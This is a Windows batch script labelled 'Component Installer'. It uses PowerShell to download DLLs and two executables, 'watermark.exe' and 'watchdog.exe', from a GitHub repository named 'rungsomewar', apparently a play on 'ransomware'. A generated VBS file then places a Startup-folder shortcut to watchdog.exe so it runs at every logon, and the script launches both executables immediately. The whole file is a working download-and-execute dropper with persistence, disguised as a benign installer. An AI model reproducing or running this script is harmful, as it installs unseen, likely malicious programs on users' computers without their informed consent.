@echo off
setlocal
title Component Installer

:: 1. Setup the permanent home for these files
set "TARGET_DIR=%LOCALAPPDATA%\rungsomewar"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo Downloading files from raw GitHub links...

:: 2. Download each file using your specific links
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2.dll' -OutFile '%TARGET_DIR%\SDL2.dll' -UseBasicParsing; ^
Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2_ttf.dll' -OutFile '%TARGET_DIR%\SDL2_ttf.dll' -UseBasicParsing; ^
Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/libfreetype-6.dll' -OutFile '%TARGET_DIR%\libfreetype-6.dll' -UseBasicParsing; ^
Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/zlib1.dll' -OutFile '%TARGET_DIR%\zlib1.dll' -UseBasicParsing; ^
Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watermark.exe' -OutFile '%TARGET_DIR%\watermark.exe' -UseBasicParsing; ^
Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watchdog.exe' -OutFile '%TARGET_DIR%\watchdog.exe' -UseBasicParsing"

:: 3. Create the startup shortcut
set "VBS=%TEMP%\launcher.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS%"
echo sLinkFile = "%STARTUP_DIR%\rungsomewar.lnk" >> "%VBS%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS%"
echo oLink.TargetPath = "%TARGET_DIR%\watchdog.exe" >> "%VBS%"
echo oLink.WorkingDirectory = "%TARGET_DIR%" >> "%VBS%"
echo oLink.Save >> "%VBS%"

cscript /nologo "%VBS%"
del "%VBS%"

:: 4. Run immediately
start "" "%TARGET_DIR%\watermark.exe"
start "" "%TARGET_DIR%\watchdog.exe"

echo Installation Complete.
exit
